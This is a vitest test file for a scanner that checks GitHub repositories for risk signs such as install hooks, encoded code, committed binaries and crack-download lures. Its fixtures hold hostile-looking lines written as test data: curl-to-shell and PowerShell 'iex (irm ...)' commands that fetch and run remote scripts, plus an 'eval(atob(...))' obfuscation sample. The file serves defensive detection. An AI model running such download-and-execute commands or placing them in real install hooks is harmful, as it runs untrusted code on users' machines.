import { describe, expect, it } from 'vitest'
import type { Deps } from './githubTop'
import { safetyCheck } from './repoSafety'

const b64 = (s: string) => Buffer.from(s).toString('base64')
const json = (b: unknown, status = 200) => new Response(JSON.stringify(b), { status })
type Repo = { meta?: Record<string, unknown>; files?: Record<string, string>; sizes?: Record<string, number>; commits?: number; readme?: string; org?: unknown }

// A fake GitHub holding one repository: its record, file list, files, commits, README and owner.
function fake(r: Repo = {}) {
  const calls: string[] = []
  const files = r.files ?? { 'src/index.js': 'console.log(1)' }
  const meta = { stargazers_count: 400, description: 'A tidy library', size: 800, created_at: '2024-01-01T00:00:00Z', language: 'JavaScript', topics: [], license: { spdx_id: 'MIT' }, ...r.meta }
  const d: Deps = {
    cache: new Map(), retryMs: 0, now: () => Date.parse('2026-11-05T00:00:00Z'), run: async () => { throw new Error('no gh') },
    fetchImpl: (async (u: string) => {
      calls.push(u)
      const path = new URL(u).pathname
      if (path === '/repos/acme/lib') return json(meta)
      if (path === '/repos/acme/lib/git/trees/HEAD') return json({ tree: Object.entries(files).map(([p, c]) => ({ path: p, type: 'blob', size: r.sizes?.[p] ?? c.length })) })
      if (path.startsWith('/repos/acme/lib/contents/')) { const f = files[decodeURIComponent(path.slice('/repos/acme/lib/contents/'.length))]; return f === undefined ? json({}, 404) : json({ encoding: 'base64', content: b64(f) }) }
      if (path === '/repos/acme/lib/commits') return json(Array.from({ length: r.commits ?? 3 }, () => ({})))
      if (path === '/repos/acme/lib/readme') return json({ encoding: 'base64', content: b64(r.readme ?? '# Lib\n\nA tidy library for tidy people.') })
      if (path === '/orgs/acme') return r.org === null ? json({}, 404) : json(r.org ?? { is_verified: true })
      return json({}, 404)
    }) as unknown as typeof fetch,
  }
  return { d, calls }
}
const texts = (r: { findings: { severity: string; text: string }[] }, sev?: string) => r.findings.filter((f) => !sev || f.severity === sev).map((f) => f.text).join('\n')

describe('safetyCheck', () => {
  it('passes a plain, licensed, established repository from a verified organization', async () => {
    const { d } = fake()
    const r = await safetyCheck('acme/lib', d)
    expect(r.verdict).toBe('ok')
    expect(r.findings.map((f) => f.severity)).toEqual(['info'])
    expect(r.findings[0].text).toMatch(/verified/)
    expect(r.checked.files).toBe(1)
  })

  it('flags install hooks in package.json, and a hook that pipes a download into a shell as danger', async () => {
    const mild = await safetyCheck('acme/lib', fake({ files: { 'package.json': JSON.stringify({ scripts: { postinstall: 'node setup.js', test: 'vitest' } }) } }).d)
    expect(mild.verdict).toBe('caution')
    expect(texts(mild, 'caution')).toMatch(/postinstall: "node setup.js"/)
    expect(texts(mild)).not.toMatch(/test:/)
    const bad = await safetyCheck('acme/lib', fake({ files: { 'package.json': JSON.stringify({ scripts: { preinstall: 'curl -s https://x.io/a.sh | sh' } }) } }).d)
    expect(bad.verdict).toBe('danger')
  })

  it('flags custom code in setup.py and pyproject, and curl|sh or iex(irm in scripts', async () => {
    const r = await safetyCheck('acme/lib', fake({ files: { 'setup.py': 'from setuptools import setup\nsetup(cmdclass={"x": 1})', 'pyproject.toml': '[build-system]\nbackend-path = ["."]', 'install.sh': 'curl -fsSL https://x.io/i | bash', 'win/get.ps1': 'iex (irm https://x.io/a.ps1)' } }).d)
    expect(r.verdict).toBe('caution')
    const t = texts(r, 'caution')
    expect(t).toMatch(/setup\.py runs custom code/)
    expect(t).toMatch(/pyproject\.toml sets up a custom build/)
    expect(t).toMatch(/install\.sh downloads something and pipes it/)
    expect(t).toMatch(/win\/get\.ps1 downloads something and pipes it/)
  })

  it('flags hidden, encoded code as danger', async () => {
    const long = `x = "${'QUJD'.repeat(300)}"`
    expect((await safetyCheck('acme/lib', fake({ files: { 'run.py': long } }).d)).verdict).toBe('danger')
    expect((await safetyCheck('acme/lib', fake({ files: { 'a.js': 'eval(atob("ZG8gaXQ="))' } }).d)).verdict).toBe('danger')
  })

  it('flags committed programs, archives and minified blobs', async () => {
    const r = await safetyCheck('acme/lib', fake({ files: { 'bin/tool.exe': 'MZ', 'setup.msi': 'x', 'data/all.zip': 'PK', 'app.min.js': 'a', 'dist/ok.min.js': 'a', 'node_modules/x/y.dll': 'z' } }).d)
    const t = texts(r, 'caution')
    expect(t).toMatch(/2 program files \(bin\/tool\.exe, setup\.msi\)/)
    expect(t).toMatch(/archives \(data\/all\.zip\)/)
    expect(t).toMatch(/minified or encoded files nobody can read \(app\.min\.js\)/)
  })

  it('checks the repository itself: license, age, history, size with many stars, README lure, owner', async () => {
    const r = await safetyCheck('acme/lib', fake({ meta: { license: null, created_at: '2026-11-01T00:00:00Z' }, commits: 1, readme: 'Free download of the activated version!', org: null }).d)
    const t = texts(r, 'caution')
    expect(t).toMatch(/No license/)
    expect(t).toMatch(/less than 14 days/)
    expect(t).toMatch(/Only 1 commit of history/)
    expect(t).toMatch(/free download, a crack or an activated version/)
    expect(texts(r, 'info')).toMatch(/personal account/)
    const fakeLike = await safetyCheck('acme/lib', fake({ meta: { stargazers_count: 300, size: 1, description: 'Full version unlocker 2026, ready to run' } }).d)
    expect(fakeLike.verdict).toBe('danger')
    expect(texts(fakeLike, 'danger')).toMatch(/fake download page/)
  })

  it('reads at most 12 small files, skipping big ones, and reports what it read', async () => {
    const files: Record<string, string> = {}
    for (let i = 0; i < 20; i++) files[`s${i}.sh`] = 'echo hi'
    files['huge.sh'] = 'echo'
    const { d, calls } = fake({ files, sizes: { 'huge.sh': 70_000 } })
    const r = await safetyCheck('acme/lib', d)
    expect(calls.filter((c) => c.includes('/contents/'))).toHaveLength(12)
    expect(calls.some((c) => c.includes('huge.sh'))).toBe(false)
    expect(r.checked).toEqual({ files: 12, bytes: 12 * 'echo hi'.length })
  })

  it('caches for an hour and notes an incomplete scan when GitHub limits it', async () => {
    const { d, calls } = fake()
    await safetyCheck('acme/lib', d); await safetyCheck('acme/lib', d)
    expect(calls.filter((c) => c.endsWith('/git/trees/HEAD?recursive=1'))).toHaveLength(1)
    const limited = fake({ files: { 'a.sh': 'echo' } })
    const inner = limited.d.fetchImpl!
    limited.d.fetchImpl = (async (u: string) => (u.includes('/contents/') ? new Response('', { status: 429 }) : inner(u))) as unknown as typeof fetch
    const r = await safetyCheck('acme/lib', limited.d)
    expect(texts(r, 'info')).toMatch(/incomplete/)
  })

  it('fails when the file list cannot be read at all', async () => {
    const { d } = fake()
    d.fetchImpl = (async () => new Response('', { status: 404 })) as unknown as typeof fetch
    await expect(safetyCheck('acme/lib', d)).rejects.toThrow()
  })
})
